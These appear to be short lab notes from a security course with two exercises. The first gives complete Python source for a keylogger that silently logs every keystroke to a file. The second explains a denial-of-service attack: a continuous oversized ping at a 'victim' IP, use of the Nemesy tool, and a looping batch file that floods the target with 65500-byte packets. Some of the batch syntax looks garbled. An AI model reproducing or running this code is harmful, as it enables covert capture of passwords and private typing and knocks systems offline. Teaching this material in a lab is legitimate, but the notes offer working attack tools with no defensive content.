PRACTICAL 1: Create a simple keylogger using python.

for installation of pynput:
Open cmd and type --------- python -m pip install pynput


code:
from pynput.keyboard import Key, Listener
import logging
# if no name it gets into an empty string
log_dir = ""
# This is a basic logging function
logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG,
format='%(asctime)s:%(message)s:')
# This is from the library
def on_press(key):
logging.info(str(key))
# This says, listener is on
with Listener(on_press=on_press) as listener:
listener.join()



PRACTICAL 3: Use Nemesy to launch Dos Attack

open cmd : and put command

ipconfig
ping 10.128.131.108 -t -l 6500 (that 10.128.131.108 is an ip address of victim system)

dowmload nemesy
and unzip it to run nemesy.exe file

in notepad type the following text to generate data packets

:loop
ping<ip address of system> -l 65500 -W |-n|
goto:loop

save as .bat file
right click and open data packets will be generated
